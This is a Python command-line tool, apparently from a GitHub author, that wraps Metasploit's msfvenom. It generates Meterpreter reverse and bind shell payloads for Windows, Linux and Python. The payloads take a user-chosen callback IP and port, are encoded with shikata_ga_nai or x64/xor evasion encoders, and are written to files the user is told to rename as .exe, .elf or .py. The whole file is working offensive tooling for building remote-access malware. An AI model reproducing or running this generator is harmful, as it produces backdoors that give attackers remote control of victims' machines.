#!/usr/bin/python3

import asyncio
import subprocess
import re
import os
import sys

class Colors:
    BLACK = "\033[1;30m"
    RED = "\033[1;31m"
    GREEN = "\033[1;32m"
    YELLOW = "\033[1;33m"
    BLUE = "\033[1;34m"
    MAGENTA = "\033[1;35m"
    CYAN = "\033[1;36m"
    WHITE = "\033[1;37m"
    BOLD = "\033[1m"


class PayloadGenerator:
    def __init__(self):
        self.IP = "0.0.0.0"
        self.PORT = 1234
        self.ARCH = "x86"
        self.PAYLOAD = ""

    def list_directory(self):
        try:
            current_directory = os.getcwd()
            print(f"{Colors.GREEN}[+] Current Directory: {current_directory}\n")
            contents = os.listdir(current_directory)
            for item in contents:
                print(item)
        except Exception as e:
            print(f"{Colors.RED}[-] Error: {e}")

    def run(self):
        if not self.pre_requisite():
            print(f"{Colors.RED}\n\n[-] Metasploit is not installed.")
            sys.exit(1)

        self.info()
        while True:
            try:
                command = input(f"{Colors.BOLD}{Colors.YELLOW}pg~#{Colors.WHITE} ")
                if 'lists' in command.casefold():
                    self.lists()
                elif 'preinfo' in command.casefold():
                    self.preinfo()
                elif 'payload' in command.casefold():
                    self.select_payload()
                elif 'display' in command.casefold():
                    self.display_info()
                elif 'run' in command.casefold():
                    asyncio.run(self.generate_payload_file())
                elif 'ls' in command.casefold():    # added new command
                    self.list_directory()
                elif command.casefold() in ('clear', 'cls'):
                    os.system('cls||clear')
                elif 'exit' in command.casefold():
                    print(f"{Colors.BLUE}[-] Thank you for trying out!\n\n")
                    sys.exit()
                else:
                    pass
            except KeyboardInterrupt:
                print(f"{Colors.BLUE}[-] Type {Colors.RED}'exit'{Colors.BLUE} to quit\n")
            except Exception as e:
                print(f"{Colors.RED}[-] Error: {e}")

    def info(self):
        print(f"""\n{Colors.RED}
            ██████╗░░█████╗░██╗░░░██╗██╗░░░░░░█████╗░░█████╗░██████╗░
            ██╔══██╗██╔══██╗╚██╗░██╔╝██║░░░░░██╔══██╗██╔══██╗██╔══██╗
            ██████╔╝███████║░╚████╔╝░██║░░░░░██║░░██║███████║██║░░██║
            ██╔═══╝░██╔══██║░░╚██╔╝░░██║░░░░░██║░░██║██╔══██║██║░░██║
            ██║░░░░░██║░░██║░░░██║░░░███████╗╚█████╔╝██║░░██║██████╔╝
            ╚═╝░░░░░╚═╝░░╚═╝░░░╚═╝░░░╚══════╝░╚════╝░╚═╝░░╚═╝╚═════╝░

            ░██████╗░███████╗███╗░░██╗███████╗██████╗░░█████╗░████████╗░█████╗░██████╗░
            ██╔════╝░██╔════╝████╗░██║██╔════╝██╔══██╗██╔══██╗╚══██╔══╝██╔══██╗██╔══██╗
            ██║░░██╗░█████╗░░██╔██╗██║█████╗░░██████╔╝███████║░░░██║░░░██║░░██║██████╔╝
            ██║░░╚██╗██╔══╝░░██║╚████║██╔══╝░░██╔══██╗██╔══██║░░░██║░░░██║░░██║██╔══██╗
            ╚██████╔╝███████╗██║░╚███║███████╗██║░░██║██║░░██║░░░██║░░░╚█████╔╝██║░░██║
            ░╚═════╝░╚══════╝╚═╝░░╚══╝╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░░╚════╝░╚═╝░░╚═╝
        \n
        {Colors.CYAN}
        Pg v1.2 Alpha
        Written by str1ke007
        Copyright©

        {Colors.BOLD}{Colors.YELLOW}'lists' to display the command

        {Colors.CYAN}github: https://github.com/str1ke007 {Colors.WHITE}
        """)

    def lists(self):
        print(f"\n{Colors.RED}preinfo{Colors.WHITE}\t\tenter basic details")
        print(f"{Colors.RED}payload{Colors.WHITE}\t\tdisplays info about the available payloads")
        print(f"{Colors.RED}run{Colors.WHITE}\t\trun the generator")
        print(f"{Colors.RED}display{Colors.WHITE}\t\tdisplay parameters")
        print(f"{Colors.RED}ls{Colors.WHITE}\t\tlists directory contents and current directory")
        print(f"{Colors.RED}clear{Colors.WHITE}\t\tclear screen")
        print(f"{Colors.RED}exit{Colors.WHITE}\t\texit\n")

    def display_info(self):
        print(f"\n{Colors.MAGENTA}IP\t: {self.IP}")
        print(f"PORT\t: {self.PORT}")
        if self.ARCH == "x64":
            print(f"ARCH\t: x64\n")
        else:
            print(f"ARCH\t: x86\n")
        try:
            self.display_payload()
        except:
            print(f"\n\n{Colors.RED}[-] No payload to display{Colors.WHITE}\n\n")

    def display_payload(self):
        print(f"PAYLOAD\t: {self.PAYLOAD}\n{Colors.WHITE}")

    def pre_requisite(self):
        from shutil import which
        return which("msfvenom") is not None

    def check(self, IP):
        regex = "^((25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])\.){3}(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])$"
        return bool(re.search(regex, IP))

    def select_payload(self):
        # Payload
        payload = {
            1: "windows/meterpreter/reverse_http",
            2: "windows/meterpreter/reverse_https",
            3: "windows/meterpreter/reverse_tcp",
            4: "linux/x86/meterpreter/bind_tcp",
            5: "linux/x86/meterpreter/reverse_tcp",
            6: "linux/x64/meterpreter/bind_tcp",
            7: "linux/x64/meterpreter/reverse_tcp",
            8: "python/meterpreter/reverse_http",
            9: "python/meterpreter/reverse_https",
            10: "python/meterpreter/reverse_tcp",
        }

        print("\n")
        self.menu(payload, "Payload Options")

    def menu(self, options, title):
        print(f"{Colors.GREEN}{title}")
        for key, value in options.items():
            print(f"{Colors.GREEN}{key}{Colors.WHITE}", value, sep=" : ")

        PAYLOAD = self.get_payload_choice()
        selected_payload = options.get(PAYLOAD)
        if selected_payload is not None:
            self.PAYLOAD = selected_payload
            print(f"\n{Colors.GREEN}[+] Payload selected: {selected_payload}\n")
        else:
            print(f"\n{Colors.RED}[-] Invalid Payload option. Please try again.\n")

    def get_payload_choice(self):
        try:
            PAYLOAD = int(input(f"{Colors.BOLD}{Colors.YELLOW}pg~#{Colors.WHITE} "))
            return PAYLOAD
        except ValueError:
            print(f"{Colors.RED}\n[-] Invalid Input! Please enter a number corresponding to the payload.\n{Colors.WHITE}")
            return None

    def preinfo(self):
        while True:
            print(f"\n\t{Colors.BLUE}Available Options\n{Colors.RED}  IP\n  PORT\n  ARCHITECTURE\n\n{Colors.CYAN}IP?\n")
            IP = input(f"{Colors.BOLD}{Colors.YELLOW}pg~#{Colors.WHITE} ")
            if self.check(IP):
                try:
                    print(f"\n{Colors.CYAN}PORT?\n")
                    PORT = int(input(f"{Colors.BOLD}{Colors.YELLOW}pg~#{Colors.WHITE} "))
                    if PORT in range(2, 65535):
                        arch_options = {
                            1: "x64",
                            2: "x86"
                        }
                        print(f"\n{Colors.RED}Architecture (Default -> x86){Colors.GREEN}\n1) x64\n2) x86\n")
                        arch_input = input(f"{Colors.BOLD}{Colors.YELLOW}pg~#{Colors.WHITE} ")
                        ARCH = int(arch_input) if arch_input.isdigit() else 2

                        if ARCH not in arch_options:
                            print(f"{Colors.RED}\n[-] Invalid ARCH option. Selecting Default ARCH=x86\n")
                            ARCH = 2

                        self.IP, self.PORT, self.ARCH = IP, PORT, arch_options[ARCH]
                        break
                    else:
                        print(f"{Colors.RED}\n[-] Invalid PORT number. Please enter a value between 1 and 65535.\n")
                except ValueError:
                    print(f"{Colors.RED}\n[-] Invalid PORT format. Please try again.\n")
            else:
                print(f"{Colors.RED}\n[-] Invalid IP address format. Please try again.\n")

    async def generate_payload(self):
        try:
            if not self.pre_requisite():
                print(f"{Colors.RED}\n\n[-] Metasploit is not installed.")
                return

            self.info()

            while True:
                try:
                    command = input(f"{Colors.BOLD}{Colors.YELLOW}pg~#{Colors.WHITE} ")
                    if 'lists' in command.casefold():
                        self.lists()
                    elif 'preinfo' in command.casefold():
                        await self.preinfo()
                    elif 'payload' in command.casefold():
                        await self.select_payload()
                    elif 'display' in command.casefold():
                        self.display_info()
                    elif 'run' in command.casefold():
                        await self.generate_payload_file()
                    elif command.casefold() in ('clear', 'cls'):
                        os.system('clear')
                    elif 'exit' in command.casefold():
                        print(f"{Colors.BLUE}[-] Thank you for trying out!\n\n")
                        return
                    else:
                        pass
                except KeyboardInterrupt:
                    print(f"{Colors.BLUE}[-] Type {Colors.RED}'exit'{Colors.BLUE} to quit\n")
                except Exception as e:
                    print(f"{Colors.RED}[-] Error: {e}")
        except Exception as e:
            print(f"{Colors.RED}[-] Error: {e}")

    def cleanup_subprocess(self):
        if hasattr(self, 'process') and self.process.returncode is None:
            self.process.terminate()
            self.process.wait()

    async def generate_payload_file(self):
        if not self.IP or not self.PORT or not self.PAYLOAD:
            print(f"{Colors.RED}[-] Incomplete payload information! Please run 'preinfo' and 'payload' commands first.")
            return

        try:
            print(f"\n{Colors.CYAN}[+] Please wait for a few minutes...\n{Colors.CYAN}")
            arch_option = "x64" if self.ARCH == "x64" else "x86"

            platforms = {
                "windows": ["Windows", "x64/xor" if self.ARCH == "x64" else "x86/shikata_ga_nai"],
                "linux": ["Linux", "x64/xor" if self.ARCH == "x64" else "x86/shikata_ga_nai"],
                "python": ["python", ""]
            }

            payload_type = self.PAYLOAD.split('/')[0]
            platform_info = platforms.get(payload_type)
            if platform_info is None:
                print(f"{Colors.RED}[-] Invalid Payload!")
                return

            platform, encoder = platform_info

            output_file = f"reverse.{payload_type}"
            if payload_type == "python":
                cmd = ["msfvenom", "-p", self.PAYLOAD, f"LHOST={self.IP}", f"LPORT={self.PORT}", "--platform", platform, "-f", "raw", "-o", output_file]
            else:
                cmd = ["msfvenom", "-p", self.PAYLOAD, f"LHOST={self.IP}", f"LPORT={self.PORT}", "--platform", platform, "--encoder", encoder, "--arch", arch_option, "-f", "raw", "-o", output_file]

            process = await asyncio.create_subprocess_exec(*cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout, stderr = await process.communicate()

            if process.returncode == 0:
                print(f"{Colors.GREEN}[+] Successful\n[+] File saved in {os.getcwd()}/{output_file}\n")
                print(f"{Colors.GREEN}[+] Change the extension of the output file as follows\n\tWindows: *.exe\n\tLinux: *.elf\n\tPython: *.py\n")
            else:
                print(f"{Colors.RED}[-] Error: Payload generation failed. Please check your input and try again.")
                if stderr:
                    print(f"{Colors.RED}[+] Error Output: {stderr.decode('utf-8')}")
        except Exception as e:
            print(f"{Colors.RED}[-] Error: {e}")

if __name__ == "__main__":
    payload_generator = PayloadGenerator()
    payload_generator.run()
